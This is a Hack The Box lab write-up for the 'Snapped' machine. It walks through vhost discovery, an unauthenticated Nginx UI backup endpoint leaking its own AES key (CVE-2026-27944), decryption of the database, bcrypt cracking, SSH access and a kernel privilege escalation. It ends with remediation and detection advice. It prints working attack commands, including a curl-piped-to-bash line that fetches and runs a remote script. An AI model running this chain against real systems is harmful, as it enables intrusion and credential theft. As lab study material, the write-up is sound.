---
title: "Snapped — Pre-Authentication Backup Disclosure and Encryption-Key Leak"
description: "Virtual host enumeration exposes an administrative interface and a pre-authentication backup disclosure that leaks AES key material; decrypting the application database recovers an SSH credential, and local enumeration identifies a privilege-escalation path."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - web
  - cve
  - nginx
  - credential-recovery
  - privilege-escalation
objective: "Exploit an unauthenticated backup endpoint that leaks its own AES key material to recover an SSH credential, then escalate to root through a local kernel vulnerability."
tools:
  - nmap
  - feroxbuster
  - gobuster
  - curl
  - openssl
  - unzip
  - sqlite3
  - hashcat
  - ssh
  - python3
skill: "Web trust-boundary analysis and offline credential recovery"
outcome: "SSH user access from a cracked application password hash, then root via a local kernel vulnerability."
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Hard |
| Target environment | Ubuntu Linux; OpenSSH 9.6p1, nginx 1.24.0, Nginx UI 2.3.2 |
| Starting position | Unauthenticated network access |
| Objective | Exploit an unauthenticated backup endpoint that leaks its own AES key material to recover an SSH credential, then escalate to root |
| Outcome | SSH user shell from a cracked application password hash; root via a local kernel vulnerability |

## Backup endpoint leaks its AES key

Snapped is a Hard-rated Hack The Box Linux lab exposing SSH and an Nginx-hosted web service. Virtual-host enumeration uncovers an administrative subdomain running Nginx UI, whose exact version is disclosed by client-side JavaScript. A backup endpoint reachable without authentication returns the AES key and IV needed to decrypt its own backup in a response header; decrypting the application database yields bcrypt password hashes, and cracking one provides SSH access as a low-privileged user. Local CVE enumeration then identifies a kernel vulnerability that provides root. This writeup replaces target identifiers, credentials, and secret values with role-based placeholders and leaves command syntax intact. See [how evidence is handled](/method/).

**Attack path:** **Virtual-host discovery → Nginx UI version disclosure → unauthenticated backup endpoint leaking AES key/IV → database decryption → bcrypt hash cracking → SSH user access → local kernel CVE → root**

## Ubuntu Nginx UI host, unauthenticated start, root objective

- **Target:** an Ubuntu host exposing OpenSSH 9.6p1 and nginx 1.24.0.
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** discover the real administrative surface, recover application-authentication material from an unauthenticated backup feature, turn it into system access, and assess local privilege escalation.
- **Constraints:** all activity stayed inside the Hack The Box lab environment.

## Evidence: vhost discovery, backup decrypt, and kernel CVE

### 1. Service and Virtual-Host Enumeration

Observation: a full TCP scan exposes two services, and the web service redirects to a hostname that is the only route to the application.

```bash
nmap <TARGET_IP> --ulimit 5000 -p- -Pn -sC -sV -oN <SCAN_OUTPUT>
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://<PRIMARY_VHOST>/
```

Directory enumeration against the primary host returns little beyond static content:

```bash
feroxbuster --url http://<PRIMARY_VHOST> --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
```

```text
200      GET      553l     1927w    17808c http://<PRIMARY_VHOST>/style.css
200      GET      539l     1856w    20199c http://<PRIMARY_VHOST>/
```

The host is then fuzzed for virtual hosts, which exposes an administrative subdomain:

```bash
gobuster vhost \
  --url http://<PRIMARY_VHOST> \
  --wordlist /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  --append-domain
```

```text
<ADMIN_VHOST> Status: 200 [Size: 1407]
```

Significance: the redirect reveals the primary hostname, but the primary vhost serves little beyond a stylesheet; virtual-host enumeration reaches an administrative interface that directory brute-force does not, and the interface is an Nginx UI instance.

Result: SSH and HTTP are exposed, and the administrative interface at `<ADMIN_VHOST>` is identified.

### 2. Application Version Disclosure

Observation: the administrative interface is a single-page application whose client-side JavaScript references separate version files.

```bash
curl -s http://<ADMIN_VHOST>/assets/<APPLICATION_SCRIPT> | grep -oP 'version[-\w]*\.js'
```

```text
<VERSION_SCRIPT>
```

```bash
curl -s http://<ADMIN_VHOST>/assets/<VERSION_SCRIPT>
```

```text
const t="2.3.2";const o={version:t,build_id:1,total_build:512};export{o as a,t as v};
```

Significance: a version file reachable without authentication makes precise vulnerability mapping trivial. Nginx UI 2.3.2 predates the fix for CVE-2026-27944 (fixed in 2.3.3), an unauthenticated backup endpoint that discloses its own decryption keys.

Result: Nginx UI 2.3.2 is identified and mapped to CVE-2026-27944.

### 3. Backup Disclosure and Database Decryption

Observation: the unauthenticated backup endpoint returns a response header carrying both the AES-256-CBC key and the IV used to encrypt the backup.

```bash
grep -i '^X-Backup-Security:' headers.txt
```

```text
X-Backup-Security: <BACKUP_KEY_BASE64>:<BACKUP_IV_BASE64>
```

The two Base64 values are converted to hex for OpenSSL, then the backup artifacts are decrypted with the leaked key material:

```bash
export KEY_B64='<BACKUP_KEY_BASE64>'
export IV_B64='<BACKUP_IV_BASE64>'

KEY_HEX=$(printf '%s' "$KEY_B64" | base64 -d | xxd -p -c 0)
IV_HEX=$(printf '%s' "$IV_B64" | base64 -d | xxd -p -c 0)

unzip backup.zip -d backup

openssl enc -aes-256-cbc -d \
  -in backup/<ENCRYPTED_ARCHIVE> \
  -out <DECRYPTED_ARCHIVE> \
  -K "$KEY_HEX" \
  -iv "$IV_HEX"

unzip <DECRYPTED_ARCHIVE> -d <EXTRACTED_DIR>
```

Significance: the endpoint returns the encrypted backup while the header discloses the key and IV that protect it, so the backup's confidentiality depends entirely on the endpoint being unauthenticated.

Result: the backup decrypts with the leaked key material, and the application SQLite database is recovered.

### 4. Credential Extraction and SSH Access

Observation: the recovered database stores account password verifiers.

```bash
sqlite3 <APPLICATION_DATABASE> 'select name,password from users;'
```

```text
<ADMIN_ACCOUNT>|<PASSWORD_VERIFIER_1>
<LAB_USER>|<PASSWORD_VERIFIER_2>
```

The verifiers are bcrypt hashes, and offline recovery with Hashcat's bcrypt mode (`-m 3200`) recovers one cleartext password:

```bash
hashcat <HASH_FILE> /usr/share/wordlists/rockyou.txt -m 3200
```

```text
<LAB_USER> : <LAB_USER_PASSWORD>
```

The recovered credential authenticates over SSH:

```bash
ssh <LAB_USER>@<PRIMARY_VHOST>
```

```text
<LAB_USER>@<HOST>:~$ whoami
<LAB_USER>
```

Significance: the application-stored verifier matches the host account's password, so cracking one hash crosses the application/system trust boundary. bcrypt is intentionally slow, but the account's password is weak enough to recover from a common wordlist.

Result: SSH authentication succeeds and yields a user-level shell as `<LAB_USER>`.

### 5. Local Privilege Escalation: Kernel CVE

Observation: I checked the host for known kernel vulnerabilities.

A hosted enumeration script is retrieved and run; the URL is summarized rather than shown:

```bash
curl -sL <CVE_ENUM_SCRIPT_URL> | bash
```

```text
[!] cve-2026-31431 Test for the Copy Fail vulnerability.................... yes!
```

The flagged vulnerability is then exercised with a local proof-of-concept:

```bash
python3 <EXPLOIT_SCRIPT>
```

```text
# whoami
root
```

Significance: the enumeration script reports CVE-2026-31431, a Linux kernel crypto-interface flaw referred to as "Copy Fail," and the proof-of-concept turns that local access into a root shell. The exploit is transferred from the operator host and run locally; its source is summarized rather than reproduced.

Result: the proof-of-concept returns a root shell, confirmed by `whoami`.

## Vhost fuzzing and decrypting with the leaked key

| Challenge | Decision | Rationale |
|---|---|---|
| The primary vhost exposed only static content | Moved from directory enumeration to virtual-host fuzzing | Directory brute-force did not reveal the administrative interface carried on a subdomain |
| Backup artifacts were encrypted | Decrypted them with the AES key and IV leaked in the same response header | The key material was disclosed by the unauthenticated backup endpoint itself |

## Outcome: SSH user and root via kernel CVE

The source records unauthenticated access to an application backup endpoint, recovery of an SSH credential, and SSH access as `<LAB_USER>`, plus a root shell from a local kernel proof-of-concept. The privilege-escalation exploit is summarized; its source is not reproduced.

## Recommendations: the backup endpoint, credential reuse, version disclosure, and the kernel CVE

These recommendations were not tested against the lab host.

1. **Unauthenticated backup endpoint exposing key material.** The backup endpoint required no authentication and returned the AES key and IV in the `X-Backup-Security` header, so an unauthenticated party could decrypt a full system backup. *Recommendation:* require authentication and authorization on backup endpoints, deliver encryption keys out-of-band rather than in the response, and treat backups as sensitive data. *Detection:* alert when unauthenticated clients access backup endpoints or download backups.
2. **Application-stored credential reused for system access.** The database stored a bcrypt password verifier whose cleartext also authenticated over SSH, so one crack crossed the application/system boundary. *Recommendation:* enforce strong, unique passwords and never reuse application credentials for host accounts; prefer key-based SSH. *Detection:* flag shared credentials across services and monitor for authentication from unexpected sources.
3. **Version disclosure easing CVE mapping.** Client-side JavaScript exposed the exact application version, so vulnerability identification was straightforward once the interface was found. *Recommendation:* apply security patches promptly and minimize exposed version and build detail. *Detection:* inventory externally reachable application versions and compare them against vendor advisories.
4. **Unpatched local kernel vulnerability.** CVE-2026-31431 allowed a local user to escalate to root. *Recommendation:* track and apply kernel security updates. *Detection:* run periodic local vulnerability checks and correlate the results with patch status.

## References

- [Hack The Box — Snapped](https://app.hackthebox.com/machines/Snapped) (retired machine)
- [NVD — CVE-2026-27944](https://nvd.nist.gov/vuln/detail/CVE-2026-27944) (Nginx UI unauthenticated backup key disclosure, fixed in 2.3.3)
- [GitHub Security Advisory GHSA-g9w5-qffc-6762 — Nginx UI](https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-g9w5-qffc-6762) (vendor advisory for CVE-2026-27944)
- [NVD — CVE-2026-31431](https://nvd.nist.gov/vuln/detail/CVE-2026-31431) (Linux kernel local privilege escalation, "Copy Fail")
- [Linux kernel CVE announcement — CVE-2026-31431](https://lore.kernel.org/linux-cve-announce/2026042214-CVE-2026-31431-3d65@gregkh/) (vendor advisory)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [Gobuster](https://github.com/OJ/gobuster) (virtual-host discovery)
- [feroxbuster](https://github.com/epi052/feroxbuster) (content discovery)
- [OpenSSL `enc`](https://docs.openssl.org/master/man1/openssl-enc/) (symmetric encryption and decryption)
- [SQLite command-line shell](https://sqlite.org/cli.html)
- [Hashcat](https://hashcat.net/hashcat/) (offline password recovery)
- [Nginx UI](https://github.com/0xJacky/nginx-ui) (application project repository)
